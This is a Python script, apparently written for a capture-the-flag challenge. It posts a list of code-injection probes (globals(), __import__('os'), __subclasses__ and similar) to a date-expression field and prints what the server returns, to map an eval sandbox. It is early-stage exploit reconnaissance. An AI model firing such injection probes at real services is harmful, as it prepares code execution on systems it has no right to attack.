import requests
import re

url = "http://y2k-compliance-checker.hackday.fr:8000/check"
payloads = [
    "1+1",
    "dir()",
    "globals()",
    "locals()",
    "vars()",
    "__builtins__",
    "__import__",
    "os",
    "__import__('os')",
    "compile",
    "eval",
    "exec",
    "request",
    "app",
    "self",
    "open",
    "read",
    "__class__",
    "__mro__",
    "__subclasses__",
    "__base__",
    "()",
    "[]",
    "{}",
    "''",
    "\"\"",
    "+",
    "-",
    "*",
    "/",
    ".",
    "_",
]

print("Testing payloads...")
for p in payloads:
    try:
        r = requests.post(url, data={"date_expr": p})
        match = re.search(r'<div class="result"><pre>(.*?)</pre></div>', r.text, re.DOTALL)
        if match:
            result = match.group(1).strip()
            print(f"{p:<20} : {result}")
        else:
            print(f"{p:<20} : NO MATCH / ERROR (Status: {r.status_code})")
    except Exception as e:
        print(f"{p:<20} : EXCEPTION {e}")
